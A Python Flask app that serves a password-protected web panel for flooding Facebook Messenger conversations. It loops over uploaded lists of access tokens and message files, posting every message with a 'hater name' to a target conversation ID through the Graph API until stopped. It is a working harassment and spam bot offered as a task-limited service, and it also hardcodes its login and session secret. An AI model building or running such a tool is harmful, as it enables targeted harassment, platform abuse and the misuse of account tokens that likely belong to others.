from flask import Flask, request, render_template_string, session, redirect, url_for
import requests
from threading import Thread, Event
import time
import random
import string
import os

app = Flask(__name__)
app.secret_key = "SuperSecretKey2025"  # Session Security

USERNAME = "vampire boy raj"
PASSWORD = "vampire rulex"

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64)',
    'Referer': 'https://www.google.com/'
}

stop_events = {}
threads = {}
task_count = 0
MAX_TASKS = 10000  # 1 Month = 10,000 Task Limit

def send_messages(access_tokens, thread_id, hatersname, lastname, time_interval, messages, task_id):
    global task_count
    stop_event = stop_events[task_id]
    
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v17.0/t_{thread_id}/'
                message = f"{hatersname} {message1} {lastname}"  # Format: hatersname + message + lastname
                parameters = {'access_token': access_token, 'message': message}
                requests.post(api_url, data=parameters, headers=headers)
                time.sleep(time_interval)
    
    task_count -= 1
    del stop_events[task_id]
    del threads[task_id]

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('send_message'))
        return '❌ Invalid Username or Password!'
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login - By RAJ MISHRA</title>
        <style>
            body { text-align: center; background: url('https://i.ibb.co/1JLx8sbs/5b7cfab06a854bf09c9011203295d1d5.jpg') no-repeat center center fixed; 
                   background-size: cover; color: white; padding: 100px; }
            input { padding: 10px; margin: 5px; width: 250px; }
            button { padding: 10px; background: red; color: white; border: none; }
        </style>
    </head>
    <body>
        <h2>Login to Access</h2>
        <form method="post">
            <input type="text" name="username" placeholder="Enter Username" required><br>
            <input type="password" name="password" placeholder="Enter Password" required><br>
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
    ''')

@app.route('/home', methods=['GET', 'POST'])
def send_message():
    global task_count
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    if request.method == 'POST':
        if task_count >= MAX_TASKS:
            return '⚠️ Monthly Task Limit Reached!'

        token_option = request.form.get('tokenOption')

        if token_option == 'single':
            access_tokens = [request.form.get('singleToken').strip()]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId').strip()
        hatersname = request.form.get('hatersname').strip()
        lastname = request.form.get('lastname').strip()
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, hatersname, lastname, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()
        
        task_count += 1
        return f'Task started with ID: {task_id}'

    return render_template_string(f'''
    <!DOCTYPE html>
    <html>
    <head>
      <title>Offline Tool - By RAJ MISHRA</title>
      <style>
        body {{ background: url('https://i.ibb.co/1JLx8sbs/5b7cfab06a854bf09c9011203295d1d5.jpg') no-repeat center center fixed; 
               background-size: cover; color: white; text-align: center; padding: 50px; }}
        input, select, button {{ margin: 5px; padding: 10px; }}
      </style>
    </head>
    <body>
      <h2>Users Running: {task_count} / {MAX_TASKS}</h2>
      <form method="post" enctype="multipart/form-data">
        <select name="tokenOption" required>
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select><br>
        <input type="text" name="singleToken" placeholder="Enter Single Token"><br>
        <input type="file" name="tokenFile"><br>
        <input type="text" name="threadId" placeholder="Enter Inbox/Convo ID" required><br>
        <input type="text" name="hatersname" placeholder="Enter Hater Name" required><br>
        <input type="text" name="lastname" placeholder="Enter Last Name" required><br>
        <input type="number" name="time" placeholder="Enter Time (seconds)" required><br>
        <input type="file" name="txtFile" required><br>
        <button type="submit">Run</button>
      </form>
      <form method="post" action="/stop">
        <input type="text" name="taskId" placeholder="Enter Task ID to Stop" required><br>
        <button type="submit">Stop</button>
      </form>
    </body>
    </html>
    ''')

@app.route('/stop', methods=['POST'])
def stop_task():
    global task_count
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        task_count -= 1
        return f'Task {task_id} stopped.'
    return 'Invalid Task ID.'

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
